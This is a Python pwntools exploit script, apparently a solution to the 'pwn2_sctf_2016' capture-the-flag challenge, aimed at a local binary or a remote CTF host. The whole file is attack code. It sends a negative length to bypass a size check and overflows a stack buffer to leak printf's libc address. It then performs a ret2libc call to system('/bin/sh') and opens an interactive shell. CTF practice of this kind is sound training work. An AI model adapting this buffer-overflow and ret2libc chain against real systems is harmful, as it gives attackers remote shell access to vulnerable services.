import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./pwn2_sctf_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn2_sctf_2016')
			libc=ELF('/lib/i386-linux-gnu/libc-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28345)
			elf=ELF('pwn2_sctf_2016')
			libc=ELF('./libc.so')


		io.recv()
		io.sendline('-1')
		io.recv()
		pay='a'*0x30+p32(elf.plt['printf'])+p32(0x0804852f)+p32(elf.got['printf'])
		io.sendline(pay)
		io.recv(0x47)
		libc.address=u32(io.recv()[:4])-libc.sym['printf']
		success('libc:'+hex(libc.address))
		io.sendline('-1')
		io.recv()
		pay='a'*0x30+p32(libc.sym['system'])+p32(0x0804852f)+p32(libc.search('/bin/sh\x00').next())
		io.sendline(pay)
		#io.sendline('cat flag')
		#io.recv()
		#gdb.attach(io)
		#pause()
		io.interactive()
	#except Exception as e:
		#raise e
	#else:
		#pass